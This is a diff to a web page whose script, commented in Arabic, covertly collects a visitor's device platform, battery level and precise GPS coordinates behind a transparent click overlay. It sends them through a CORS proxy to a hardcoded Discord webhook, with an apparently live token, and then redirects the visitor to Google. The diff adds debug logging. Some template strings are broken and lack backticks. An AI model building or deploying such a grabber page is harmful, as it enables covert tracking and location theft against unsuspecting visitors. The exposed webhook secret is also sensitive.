@@ -10,6 +10,8 @@
         h2 { margin-top: 0; color: #333; }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; }
         #status { margin-top: 10px; font-size: 12px; color: gray; }
+        /* صندوق الأخطاء */
+        #debug-box { position: fixed; bottom: 10px; right: 10px; background: #fff; border: 1px solid red; padding: 5px; font-size: 10px; max-height: 100px; overflow: auto; display: none; z-index: 10000; width: 200px; text-align: left; }
     </style>
 </head>
 <body>
@@ -20,13 +22,20 @@
 </div>
 
 <div id="overlay"></div>
+<div id="debug-box"></div>
 
 <script>
     // ⚙️ رابط الويب هوك الخاص بك
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1564210777194233899/KtJ9_m_v6mvbHHXpn8aVvWnTysSSqmQCBRUJiCtow8O9krQGPddn1i2ojt_cJrYNPpSZ'; 
 
+    function log(msg) {
+        const box = document.getElementById('debug-box');
+        box.style.display = 'block';
+        box.innerText += msg + "\n";
+        console.log(msg);
+    }
+
     async function sendDiscord(data) {
-        // ✅ تم تصحيح علامات التنصيص هنا
         let caption = 🎉 تقرير جديد\n\n📱 الجهاز: ${data.platform || 'N/A'};
         if (data.battery) caption += \n🔋 البطارية: ${data.battery};
         if (data.location && data.location !== "N/A") caption += \n📍 الموقع: ${data.location};
@@ -34,6 +43,7 @@
 
         try {
             const proxyUrl = 'https://corsproxy.io/?';
+            log("جاري الاتصال بـ Discord...");
             const response = await fetch(proxyUrl + encodeURIComponent(WEBHOOK_URL), {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -41,9 +51,10 @@
             });
             
             if (!response.ok) throw new Error(HTTP Error: ${response.status});
+            log("✅ تم الإرسال بنجاح!");
             return true;
         } catch (error) {
-            console.log("❌ فشل الإرسال: " + error.message);
+            log("❌ فشل الإرسال: " + error.message);
             return false;
         }
     }
@@ -60,7 +71,6 @@
                 const pos = await new Promise((resolve, reject) => 
                     navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 4000})
                 );
-                // ✅ تم تصحيح علامات التنصيص هنا أيضاً
                 location = ${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)};
             } catch (e) {}
         }
@@ -72,17 +82,13 @@
         };
     }
 
-    async function trigger() {
-        const status = document.getElementById('status');
-        status.innerText = "تم بنجاح! جاري التحويل...";
-        setTimeout(() => window.location.href = "https://google.com", 1000);
-    }
-
     async function start() {
         const data = await getDeviceInfo();
         const success = await sendDiscord(data);
+        
         if(success) {
-            await trigger();
+            document.getElementById('status').innerText = "تم بنجاح! جاري التحويل...";
+            setTimeout(() => window.location.href = "https://google.com", 1000);
         } else {
             document.getElementById('status').innerText = "حدث خطأ.";
         }
